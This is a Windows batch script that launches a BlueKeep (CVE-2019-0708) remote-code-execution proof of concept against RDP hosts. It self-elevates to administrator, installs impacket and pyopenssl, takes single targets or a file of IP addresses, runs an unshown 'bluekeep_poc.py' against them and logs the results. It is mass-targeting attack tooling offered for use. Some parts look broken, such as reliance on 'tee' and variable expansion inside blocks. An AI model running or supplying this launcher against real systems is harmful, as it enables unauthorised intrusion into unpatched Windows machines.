@echo off
:: BLUEKEEP PoC ADVANCED LAUNCHER - AP3X TOOLCHAIN
setlocal EnableDelayedExpansion
title BlueKeep Exploit Launcher [CVE-2019-0708] - AP3X Red/Purple Team Ops
color 0c

:: ===== Admin Privilege Check =====
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo [!] This script requires administrator privileges. Relaunching with elevation...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ===== Runtime Info =====
echo =====================================================
echo [*] BlueKeep Exploit Launcher - CVE-2019-0708
echo [*] Execution Time: %date% %time%
for /f "tokens=2 delims==" %%i in ('"wmic os get Caption /value"') do set OSName=%%i
echo [*] OS Detected: !OSName!
echo =====================================================

:: ===== Check Python Installation =====
where python >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Python is not installed or not in PATH.
    pause & exit /b
)

:: ===== Install Python Dependencies =====
echo [+] Ensuring required Python packages are installed...
python -m pip install --upgrade pip >nul 2>&1
python -m pip install impacket pyopenssl >nul 2>&1

:: ===== Target Input =====
set /p inputMode="Enter target IP(s) (comma-separated), or type 'F' to use a file: "
if /I "%inputMode%"=="F" (
    set /p targetFile="Enter full path to file with IP list: "
    if not exist "%targetFile%" (
        echo [!] Target file not found: %targetFile%
        pause & exit /b
    )
    set targetArgs=-f "%targetFile%"
) else (
    set targetArgs=-i %inputMode%
)

:: ===== Optional Port =====
set /p rdpPort="Enter custom RDP port [default = 3389]: "
if "%rdpPort%"=="" (
    set portArg=
) else (
    set portArg=-p %rdpPort%
)

:: ===== Logging Option =====
set logFile=bluekeep_output_%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%.log
set /p logChoice="Log output to file? (Y/N): "
if /I "%logChoice%"=="Y" (
    echo [*] Logging enabled. Output will be written to: %logFile%
    python bluekeep_poc.py %targetArgs% %portArg% | tee "%logFile%"
) else (
    python bluekeep_poc.py %targetArgs% %portArg%
)

:: ===== Cleanup/Completion =====
echo =====================================================
echo [*] BlueKeep PoC execution completed.
if /I "%logChoice%"=="Y" (
    echo [*] Results saved to: %logFile%
)
pause
exit /b
